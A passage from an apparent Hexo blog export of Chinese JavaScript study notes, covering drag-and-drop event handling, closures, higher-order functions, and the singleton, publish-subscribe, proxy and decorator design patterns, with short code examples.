<span class="token punctuation">}</span>  <span class="token function">removeHandler</span><span class="token punctuation">(</span>type<span class="token punctuation">,</span> handler<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>handlers<span class="token punctuation">[</span>type<span class="token punctuation">]</span> <span class="token keyword">instanceof</span> <span class="token class-name">Array</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">var</span> handlers <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>handlers<span class="token punctuation">[</span>type<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> len <span class="token operator">=</span> handlers<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>handlers<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">===</span> handler<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>      handlers<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="为拖放事件添加监听"><a href="#为拖放事件添加监听" class="headerlink" title="为拖放事件添加监听"></a>为拖放事件添加监听</h4><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> DragDrop <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> dragging <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">,</span>  diffX <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>  diffY <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>  dragdrop <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EventTarget</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">handleEvent</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>    event <span class="token operator">=</span> event <span class="token operator">||</span> window<span class="token punctuation">.</span>event<span class="token punctuation">;</span>    <span class="token keyword">var</span> target <span class="token operator">=</span> event<span class="token punctuation">.</span>target <span class="token operator">||</span> event<span class="token punctuation">.</span>srcElement<span class="token punctuation">;</span>    <span class="token keyword">switch</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>type<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">case</span> <span class="token string">"mousedown"</span><span class="token punctuation">:</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>target<span class="token punctuation">.</span>className<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"draggable"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        dragging <span class="token operator">=</span> target<span class="token punctuation">;</span>        diffX <span class="token operator">=</span> event<span class="token punctuation">.</span>clientX <span class="token operator">-</span> target<span class="token punctuation">.</span>offsetLeft<span class="token punctuation">;</span>        diffY <span class="token operator">=</span> event<span class="token punctuation">.</span>clientY <span class="token operator">-</span> target<span class="token punctuation">.</span>offsetTop<span class="token punctuation">;</span>        dragdrop<span class="token punctuation">.</span><span class="token function">fire</span><span class="token punctuation">(</span><span class="token punctuation">{</span>type<span class="token punctuation">:</span> <span class="token string">"dragstart"</span><span class="token punctuation">,</span> target<span class="token punctuation">:</span> dragging<span class="token punctuation">,</span> x<span class="token punctuation">:</span> event<span class="token punctuation">.</span>clientX<span class="token punctuation">,</span> y<span class="token punctuation">:</span> event<span class="token punctuation">.</span>clientY<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token string">"mousemove"</span><span class="token punctuation">:</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>dragging <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        dragging<span class="token punctuation">.</span>style<span class="token punctuation">.</span>left <span class="token operator">=</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>clientX  <span class="token operator">-</span> diffX<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'px'</span><span class="token punctuation">;</span>        dragging<span class="token punctuation">.</span>style<span class="token punctuation">.</span>top <span class="token operator">=</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>clientY  <span class="token operator">-</span> diffY<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'px'</span><span class="token punctuation">;</span>        dragdrop<span class="token punctuation">.</span><span class="token function">fire</span><span class="token punctuation">(</span><span class="token punctuation">{</span>type<span class="token punctuation">:</span> <span class="token string">"drag"</span><span class="token punctuation">,</span> target<span class="token punctuation">:</span> dragging<span class="token punctuation">,</span> x<span class="token punctuation">:</span> event<span class="token punctuation">.</span>clientX<span class="token punctuation">,</span> y<span class="token punctuation">:</span> event<span class="token punctuation">.</span>clientY<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token string">"mouseup"</span><span class="token punctuation">:</span>      dragdrop<span class="token punctuation">.</span><span class="token function">fire</span><span class="token punctuation">(</span><span class="token punctuation">{</span>type<span class="token punctuation">:</span> <span class="token string">"dragend"</span><span class="token punctuation">,</span> target<span class="token punctuation">:</span> dragging<span class="token punctuation">,</span> x<span class="token punctuation">:</span> event<span class="token punctuation">.</span>clientX<span class="token punctuation">,</span> y<span class="token punctuation">:</span> event<span class="token punctuation">.</span>clientY<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      dragging <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  dragdrop<span class="token punctuation">.</span>enable <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"mousedown"</span><span class="token punctuation">,</span> handleEvent<span class="token punctuation">)</span><span class="token punctuation">;</span>    document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"mousemove"</span><span class="token punctuation">,</span> handleEvent<span class="token punctuation">)</span><span class="token punctuation">;</span>    document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"mouseup"</span><span class="token punctuation">,</span> handleEvent<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> dragdrop<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>DragDrop<span class="token punctuation">.</span><span class="token function">enable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> target <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"target"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>DragDrop<span class="token punctuation">.</span><span class="token function">addHandler</span><span class="token punctuation">(</span><span class="token string">"dragstart"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 拖放 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript设计模式（一）</title>
      <link href="/2018/09/24/javascript-she-ji-mo-shi/"/>
      <url>/2018/09/24/javascript-she-ji-mo-shi/</url>
      
        <content type="html"><![CDATA[<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p>《JavaScript设计模式与开发实战》</p><h4 id="静态类型语言与动态类型语言"><a href="#静态类型语言与动态类型语言" class="headerlink" title="静态类型语言与动态类型语言"></a>静态类型语言与动态类型语言</h4><ul><li>静态类型语言在编译时便已确定变量的类型，而动态类型语言的变量类型要到程序运行的时候，待变量被赋予某个值之后，才会具有某种类型</li><li>静态类型语言的优点首先是在编译时就能发现类型不匹配的错误，编辑器可以帮助我们提前避免程序在运行期间有可能发生的一些错误</li><li>动态类型语言的优点是编写的代码数量更少，看起来也更加简洁，程序员可以把精力更多地放在业务逻辑上面</li><li>在动态类型语言中实现一个原则：“面向接口编程，而不是面向实现编程”</li></ul><h4 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h4><ul><li>定义：同一操作作用于不同的对象上面，可以产生不同的解释和不同的执行结果。换句话说，给不同的对象发送同一个消息的时候，这些对象会根据这个消息分别给出不同的反馈</li><li>使用继承来得到多态效果，是让对象表现出多态性的最常用手段。继承通常包括实现继承和接口继承</li><li>多态最根本的作用就是通过把过程化的条件分支语句转化为对象的多态性，从而消除这些条件分支语句</li></ul><h4 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h4><ul><li>封装的目的是将信息隐藏，包括封装数据、封装实现、封装类型和封装变化</li><li><strong>封装数据</strong><ul><li>在许多语言的对象系统中，封装数据是由语法解析来实现的，这些语言也许提供了 private、public、protected 等关键字来提供不同的访问权限</li><li>JavaScript 依赖变量的作用域来实现封装特性，而且只能模拟出 public 和 private 这两种封装性</li></ul></li><li><strong>原型模式</strong><ul><li>对象克隆<pre class=" language-JavaScript"><code class="language-JavaScript">Object.create = Object.create || function (obj) {  var F = function () {};  F.prototype = obj;  return new F();}</code></pre></li><li>基于原型链的委托机制就是原型继承的本质</li><li>原型编程的基本规则:<ul><li>所有的数据都是对象</li><li>要得到一个对象，不是通过实例化类，而是找到一个对象作为原型并克隆它</li><li>对象会记住它的原型</li><li>如果对象无法响应某个请求，它会把这个请求委托给它自己的原型</li></ul></li><li>JavaScript 中的根对象是 Object.prototype 对象；Object.prototype 对象是一个空的对象</li><li>JavaScript 的函数既可以作为普通函数被调用，也可以作为构造器被调用。当使用 new 运算符来调用函数时，此时的函数就是一个构造器</li><li>JavaScript 给对象提供了一个名为<strong>proto</strong>的隐藏属性，某个对象的<strong>proto</strong>属性默认会指向它的构造器的原型对象；如果对象无法响应某个请求，它会把这个请求委托给它的构造器的原型</li></ul></li></ul><h4 id="this"><a href="#this" class="headerlink" title="this"></a>this</h4><ul><li>JavaScript 的 this 指向哪个对象是基于运行时基于函数的执行环境动态绑定的</li><li>除去不常用的 with 和 eval 的情况，具体到实际应用中，this 的指向大致可以分为以下 4 种:<ul><li>作为对象的方法调用</li><li>作为普通函数调用</li><li>构造器调用</li><li>Function.prototype.call 或 Function.prototype.apply 调用</li></ul></li><li><strong>call和apply的区别</strong><ul><li>apply 接受两个参数，第一个参数指定了函数体内 this 对象的指向，第二个参数为一个带下标的集合，这个集合可以为数组，也可以为类数组，apply 方法把这个集合中的元素作为参数传递给被调用的函数</li><li>call 传入的参数数量不固定，跟 apply 相同的是，第一个参数也是代表函数体内的 this 指向，从第二个参数开始往后，每个参数被依次传入函数</li><li>call 和 apply 最常见的用途是改变函数内部的 this 指向</li></ul></li></ul><h4 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h4><ul><li><strong>变量的作用域</strong>：JavaScript 中，函数可以用来创造函数作用域；当在函数中搜索一个变量的时候，如果该函数内并没有声明这个变量，那么此次搜索的过程会随着代码执行环境创建的作用域链往外层逐层搜索，一直搜索到全局对象为止</li><li><strong>变量的生存周期</strong>：对于全局变量来说，全局变量的生存周期当然是永久的，除非我们主动销毁这个全局变量。而对于在函数内用 var 关键字声明的局部变量来说，当退出函数时，这些局部变量即失去了它们的价值，它们都会随着函数调用的结束而被销毁<ul><li>例子一<pre class=" language-JavaScript"><code class="language-JavaScript">var func = function () {var a = 1;//退出函数后，局部变量a将被销毁console.log(a);;};func();</code></pre></li><li>例子二：退出函数后，局部没有销毁，因为f返回了一个匿名函数的引用，可以访问到func()被调用是产生的环境<pre class=" language-JavaScript"><code class="language-JavaScript">var func = function () {var a = 1;return function () {  a++;  console.log(a);}}var f = func();f();//2f();//3</code></pre></li><li>经典例子：<pre class=" language-JavaScript"><code class="language-JavaScript">for ( var i = 0, len = nodes.length; i < len; i++ ){ (function( i ){ nodes[ i ].onclick = function(){ console.log(i); } })( i )};var report = (function(){ var imgs = []; return function( src ){ var img = new Image(); imgs.push( img ); img.src = src; }})();</code></pre></li></ul></li><li><strong>闭包的作用</strong>：<ul><li>封装变量：闭包可以帮助把一些不需要暴露在全局的变量封装成私有变量</li><li>延续局部变量的寿命</li><li>实现嵌套的回调函数</li></ul></li><li>闭包与内存管理：使用闭包的同时比较容易形成循环引用，如果闭包的作用域链中保存着一些 DOM 节点，这时候就有可能造成内存泄露；如果要解决循环引用带来的内存泄露问题，我们只需要把循环引用中的变量设为null即可。将变量设置为 null 意味着切断变量与它此前引用的值之间的连接。当垃圾收集器下次运行时，就会删除这些值并回收它们占用的内存</li></ul><h4 id="高阶函数"><a href="#高阶函数" class="headerlink" title="高阶函数"></a>高阶函数</h4><ul><li>高阶函数是指至少满足下列条件之一的函数：<ul><li>函数可以作为参数被传递</li><li>函数可以作为返回值输出</li></ul></li><li>函数作为参数传递<pre class=" language-JavaScript"><code class="language-JavaScript">//从小到大排列[ 1, 4, 3 ].sort( function( a, b ){  return a - b;}</code></pre></li><li>函数作为返回值<pre class=" language-JavaScript"><code class="language-JavaScript">//判断类型var isType = function( type ){  return function( obj ){    return Object.prototype.toString.call( obj ) === '[object '+ type +']';  }};</code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript设计模式（二）- 常见设计模式</title>
      <link href="/2018/09/24/javascript-she-ji-mo-shi-er/"/>
      <url>/2018/09/24/javascript-she-ji-mo-shi-er/</url>
      
        <content type="html"><![CDATA[<h4 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h4><ul><li>定义：保证一个类仅有一个实例，并提供一个访问它的全局访问点</li><li>实现<pre class=" language-Javascript"><code class="language-Javascript">//方法一var Singleton = function (name) {  this.name = name;  this.instance = null;};Singleton.prototype.getName = function () {  console.log(this.name);};Singleton.getInstance = function (name) {  if(!this.instance) {    this.instance = new Singleton(name);  }  return this.instance;};var a = Singleton.getInstance("sven1");var b = Singleton.getInstance("sven2");console.log(a === b);//true//方法二var Singleton = function (name) {  this.name = name;};Singleton.prototype.getName = function () {  console.log(this.name);};Singleton.getInstance = (function () {  var instance = null;  return function (name) {    if(!instance) {      instance = new Singleton(name);    }    return instance;  }})();</code></pre></li><li>透明的单例模式<pre class=" language-Javascript"><code class="language-Javascript">var CreateDiv = (function () {  var instance;  var CreateDiv = function (html) {    if(instance) {      return instance;    }    this.html = html;    this.init();    return instance = this;  };  CreateDiv.prototype.init = function () {    var div = document.createElement('div');    div.innerHTML = this.html;    document.body.appendChild(div);  };  return CreateDiv;})();var a = new CreateDiv( 'sven1' );var b = new CreateDiv( 'sven2' );alert ( a === b );</code></pre></li><li>用代理实现单例模式<pre class=" language-Javascript"><code class="language-Javascript">var CreateDiv = function (html) {  this.html = html;  this.init();};CreateDiv.prototype.init = function () {  var div = document.createElement('div');  div.innerHTML = this.html;  document.body.appendChild(div);};var ProxySingletonCreateDiv = (function () {  var instance;  return function (html) {    if(!instance) {      instance = new CreateDiv(html);    }    return instance;  }})();var a = new ProxySingletonCreateDiv('sven1');var b = new ProxySingletonCreateDiv('sven2');console.log(a === b);//true</code></pre></li><li>惰性单例：在需要的时候才创建对象示例<pre class=" language-Javascript"><code class="language-Javascript">//创建对象的方法fn被当成参数动态传入var getSingle = function (fb) {  var result;  return function () {    return result || (result = fn.apply(this, arguments));  }};// 创建唯一登录窗口var createLoginLayer = function () {  var div = document.createElement('div');  div.innerHTML = "我是登录浮窗"；  div.style.display = "none";  document.body.appendChild('div');  return div;};var createSingleLoginLayer = getSingle(createLoginLayer);</code></pre><h4 id="发布-订阅模式"><a href="#发布-订阅模式" class="headerlink" title="发布-订阅模式"></a>发布-订阅模式</h4></li><li>定义：发布—订阅模式又叫观察者模式，它定义对象间的一种一对多的依赖关系，当一个对象的状态发生改变时，所有依赖于它的对象都将得到通知</li><li>实现发布-订阅模式的步骤<ul><li>首先要指定谁充当发布者</li><li>给发布者添加一个缓存列表，用于存放回调函数以便通知订阅者</li><li>发布消息的时候，发布者会遍历这个缓存列表，一次触发里面存放的订阅者回调函数</li></ul></li><li>通用实现<pre class=" language-Javascript"><code class="language-Javascript">var Event = (function(){  var clientList = {},      listen,      trigger,      remove; listen = function( key, fn ){   if ( !clientList[ key ] ){     clientList[ key ] = [];   }   clientList[ key ].push( fn ); }; trigger = function(){   var key = Array.prototype.shift.call( arguments ),   fns = clientList[ key ];   if ( !fns || fns.length === 0 ){     return false;   }   for( var i = 0, fn; fn = fns[ i++ ]; ){     fn.apply( this, arguments );   } }; remove = function( key, fn ){   var fns = clientList[ key ];   if ( !fns ){     return false;   }   if ( !fn ){     fns && ( fns.length = 0 );   }else{     for ( var l = fns.length - 1; l >=0; l-- ){       var _fn = fns[ l ];       if ( _fn === fn ){         fns.splice( l, 1 );       }     }   } }; return {   listen: listen,   trigger: trigger,   remove: remove }})();</code></pre><h4 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h4></li><li>定义：代理模式是为一个对象提供一个代用品或占位符，以便控制对它的访问；代理模式的关键是，当客户不方便直接访问一个对象或者不满足需要的时候，提供一个替身对象来控制对这个对象的访问，客户实际上访问的是替身对象</li><li>虚拟代理实现图片预加载：在 Web 开发中，图片预加载是一种常用的技术，如果直接给某个 img 标签节点设置 src 属性，由于图片过大或者网络不佳，图片的位置往往有段时间会是一片空白。常见的做法是先用一张 loading 图片占位，然后用异步的方式加载图片，等图片加载好了再把它填充到 img 节点里，这种场景就很适合使用虚拟代理<pre class=" language-Javascript"><code class="language-Javascript">var myImage = (function () {  var imgNode = document.createElement('img');  document.body.appendChild(imgNode);  return {    setSrc: function (src) {      imgNode.src = src;    }  }})();var proxyImage = (function () {  var img = new Image;  img.onload = function () {    myImage.setSrc(this.src);  }  return {    setSrc: function (src) {      myImage.setSrc("file:///C:Users/loading.gif");      img.src = src;    }  }})();proxyImage.setSrc('http:// imgcache.qq.com/music/photo/k/000GGDys0yA0Nk.jpg');</code></pre></li><li>代理和本体接口的一致性<ul><li>用户可以放心地请求代理，他只关心是否能得到想要的结果</li><li>在任何使用本体的地方都可以替换成使用代理</li></ul></li></ul><h4 id="策略模式"><a href="#策略模式" class="headerlink" title="策略模式"></a>策略模式</h4><ul><li>定义：定义一系列的算法，把它们一个个封装起来，并且使它们可以相互替换</li></ul><h4 id="装饰者模式"><a href="#装饰者模式" class="headerlink" title="装饰者模式"></a>装饰者模式</h4><ul><li>定义：装饰者模式可以动态地给某个对象添加一些额外的职责，而不会影响从这个类中派生的其他对象；给对象动态地增加职责的方式称为装饰者（decorator）模式</li><li>通过保存原引用的方式就可以改写某个函数：<pre class=" language-Javascript"><code class="language-Javascript">var a = function(){  alert (1);}var _a = a;a = function(){  _a();//有可能出现this错误  alert (2);}a();</code></pre></li><li>用 AOP 装饰函数<pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">//让新添加的函数在原函数之前执行（前置装饰）</span>Function<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>before <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>beforefn<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> _self <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//包含原函数的引用</span>  <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//返回包含了原函数了新函数的代理函数</span>    beforefn<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//执行新函数，且保证this不被劫持</span>    <span class="token keyword">return</span> _self<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//执行原函数并返回原函数的执行结果</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//让新添加的函数在原函数之前执行（后置装饰）</span>Function<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>after <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>afterfn<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> _self <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> ret <span class="token operator">=</span> _self<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>    afterfn<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> ret<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li><li>不污染原型实现<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> before <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>fn<span class="token punctuation">,</span> beforefn<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    beforefn<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> fn<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li><li>实例<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>html<span class="token operator">></span> <span class="token operator">&lt;</span>button tag<span class="token operator">=</span><span class="token string">"login"</span> id<span class="token operator">=</span><span class="token string">"button"</span><span class="token operator">></span>点击打开登录浮层<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span> <span class="token operator">&lt;</span>script<span class="token operator">></span> Function<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>after <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span> afterfn <span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">var</span> __self <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>   <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">var</span> ret <span class="token operator">=</span> __self<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span> <span class="token keyword">this</span><span class="token punctuation">,</span> arguments <span class="token punctuation">)</span><span class="token punctuation">;</span>   afterfn<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span> <span class="token keyword">this</span><span class="token punctuation">,</span> arguments <span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> ret<span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token keyword">var</span> showLogin <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token string">'打开登录浮层'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">var</span> log <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token string">'上报标签为: '</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span> <span class="token string">'tag'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> showLogin <span class="token operator">=</span> showLogin<span class="token punctuation">.</span><span class="token function">after</span><span class="token punctuation">(</span> log <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 打开登录浮层之后上报数据</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span> <span class="token string">'button'</span> <span class="token punctuation">)</span><span class="token punctuation">.</span>onclick <span class="token operator">=</span> showLogin<span class="token punctuation">;</span> <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span></code></pre></li><li>表单验证<pre class=" language-javascript"><code class="language-javascript">Function<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>before <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span> beforefn <span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">var</span> __self <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span> beforefn<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span> <span class="token keyword">this</span><span class="token punctuation">,</span> arguments <span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean">false</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">// beforefn 返回 false 的情况直接 return，不再执行后面的原函数</span>     <span class="token keyword">return</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>   <span class="token keyword">return</span> __self<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span> <span class="token keyword">this</span><span class="token punctuation">,</span> arguments <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">var</span> validata <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> username<span class="token punctuation">.</span>value <span class="token operator">===</span> <span class="token string">''</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>   alert <span class="token punctuation">(</span> <span class="token string">'用户名不能为空'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> password<span class="token punctuation">.</span>value <span class="token operator">===</span> <span class="token string">''</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>   alert <span class="token punctuation">(</span> <span class="token string">'密码不能为空'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">var</span> formSubmit <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">var</span> param <span class="token operator">=</span> <span class="token punctuation">{</span>   username<span class="token punctuation">:</span> username<span class="token punctuation">.</span>value<span class="token punctuation">,</span>   password<span class="token punctuation">:</span> password<span class="token punctuation">.</span>value <span class="token punctuation">}</span>  <span class="token function">ajax</span><span class="token punctuation">(</span> <span class="token string">'http:// xxx.com/login'</span><span class="token punctuation">,</span> param <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>formSubmit <span class="token operator">=</span> formSubmit<span class="token punctuation">.</span><span class="token function">before</span><span class="token punctuation">(</span> validata <span class="token punctuation">)</span><span class="token punctuation">;</span>submitBtn<span class="token 